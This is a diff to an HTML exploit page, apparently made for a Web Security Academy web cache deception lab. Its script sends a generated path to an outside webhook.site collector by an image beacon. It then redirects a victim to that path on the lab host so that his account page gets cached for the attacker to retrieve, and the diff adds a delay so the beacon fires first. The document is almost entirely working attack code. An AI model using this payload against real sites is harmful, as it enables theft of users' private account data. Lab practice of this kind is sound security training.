@@ -2,18 +2,19 @@
 <html>
 <head>
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-  <meta http-equiv="Pragma" content="no-cache">
 </head>
 <body>
 <script>
   const path = "/my-account/poc" + Date.now() + ".js";
   const target = "https://0a1600b3045daf6e80c70342006e008e.web-security-academy.net" + path;
   
-  // Send the unique path to your webhook so you know what URL was cached
+  // Fire webhook FIRST
   new Image().src = "https://webhook.site/04a0f607-8cea-42e8-94c8-828afff2780d?path=" + encodeURIComponent(path);
   
-  // Redirect carlos
-  document.location = target;
+  // Wait 1 second for webhook to fire, THEN redirect
+  setTimeout(function() {
+    document.location = target;
+  }, 1000);
 </script>
 </body>
 </html>
